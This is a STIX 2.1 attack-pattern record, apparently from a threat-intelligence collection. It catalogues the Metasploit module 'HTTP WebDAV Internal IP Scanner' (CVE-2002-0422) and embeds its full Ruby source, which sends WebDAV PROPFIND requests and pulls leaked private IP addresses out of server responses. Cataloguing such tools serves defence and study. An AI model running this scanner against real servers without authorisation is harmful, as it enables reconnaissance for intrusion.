{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac55f0a2-493c-4571-9809-04f535e0347e",
    "created": "2024-08-14T16:28:36.991792Z",
    "modified": "2024-08-14T16:28:36.991796Z",
    "name": "HTTP WebDAV Internal IP Scanner",
    "description": "Detect webservers internal IPs though WebDAV",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/webdav_internal_ip.rb",
            "external_id": "webdav_internal_ip.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-0422"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanServer\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'HTTP WebDAV Internal IP Scanner',\n      'Description' => 'Detect webservers internal IPs though WebDAV',\n      'Author'      => ['et'],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2002-0422' ]\n        ]\n    )\n\n    register_options(\n      [\n        OptString.new(\"PATH\", [true, \"Path to use\", '/']),\n      ])\n  end\n\n  def run_host(target_host)\n\n    begin\n      res = send_request_cgi({\n        'uri'          => normalize_uri(datastore['PATH']),\n        'method'       => 'PROPFIND',\n        'data'\t=>\t'',\n        'ctype'   => 'text/xml',\n        'version' => '1.0',\n        'vhost' => '',\n      }, 10)\n\n\n      if res and res.body\n        # short regex\n        intipregex = /(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})/i\n\n        #print_status(\"#{res.body}\")\n\n        result = res.body.scan(intipregex).uniq\n\n\n        result.each do |addr|\n          print_good(\"Found internal IP in WebDAV response (#{target_host}) #{addr}\")\n\n          report_note(\n            :host\t=> target_host,\n            :proto => 'tcp',\n            :sname => (ssl ? 'https' : 'http'),\n            :port\t=> rport,\n            :type\t=> 'INTERNAL_IP',\n            :data\t=> addr\n          )\n        end\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}